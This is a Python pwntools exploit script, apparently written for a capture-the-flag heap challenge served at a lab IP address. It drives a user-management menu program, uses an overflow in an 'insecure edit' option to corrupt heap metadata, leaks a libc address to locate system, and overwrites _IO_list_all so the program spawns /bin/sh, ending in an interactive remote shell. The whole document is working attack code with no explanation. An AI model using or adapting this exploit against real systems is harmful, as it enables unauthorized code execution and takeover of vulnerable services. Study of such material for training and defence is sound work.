#!/usr/bin/python3
from pwn import *

shell = remote("10.13.37.10", 5555)

io_list_diff = 0x3c5520
read_diff = 0xf7250
sys_diff = 0x45390

def add(size, content):
    shell.sendline(b"1")
    shell.recvuntil(b"size:")
    shell.sendline(str(size).encode())
    shell.recvuntil(b"username:")
    shell.sendline(content)
    shell.recvuntil(b"6. exit")

def edit(id, mode, content):
    shell.sendline(b"2")
    shell.recvuntil(b"2. insecure edit")
    shell.sendline(str(mode).encode())
    shell.recvuntil(b"index:")
    shell.sendline(str(id).encode())
    shell.recvuntil(b"new username:")
    shell.sendline(content)
    shell.recvuntil(b"6. exit")

def ban(id):
    shell.sendline(b"3")
    shell.recvuntil(b"index:")
    shell.sendline(str(id).encode())
    shell.recvuntil(b"6. exit")

def change(name):
    shell.sendline(b"4")
    shell.recvuntil(b"enter new name:")
    shell.sendline(name)

name = b"A" * 8
shell.recvuntil(b"enter your name:")
shell.sendline(name)

add(0x88, b"A" * 0x88)
add(0x100, b"B" * 8)

payload = b"D" * 0x160
payload += p64(0)
payload += p64(0x21)

add(0x500, payload)
add(0x88, b"E" * 8)

shell.recv()
ban(2)

payload = b"A" * 0x88
payload += p16(0x281)

edit(0, 2, payload)

shell.recv()
shell.sendline(b"5")
shell.recvline()

libc_read = int(shell.recvline()[:-1], 10)
libc_base = libc_read - read_diff
libc_system = libc_base + sys_diff

payload = p64(0) * 3
payload += p64(libc_system)

change(payload)

io_list_all = libc_base + io_list_diff
name_ptr = 0x6020a0

payload = b"B" * (8 * 32)
payload += b"/bin/sh\x00"
payload += p64(0x61)
payload += p64(0)
payload += p64(io_list_all - 0x10)
payload += p64(2)
payload += p64(3)
payload += p64(0) * 21
payload += p64(name_ptr)

edit(1, 1, payload)
sleep(2)

shell.recv()
shell.sendline(b"1")
shell.recvuntil(b"size:")
shell.sendline(str(0x80).encode())
shell.recvuntil(b"[vsyscall]")
shell.recvline()
shell.interactive()
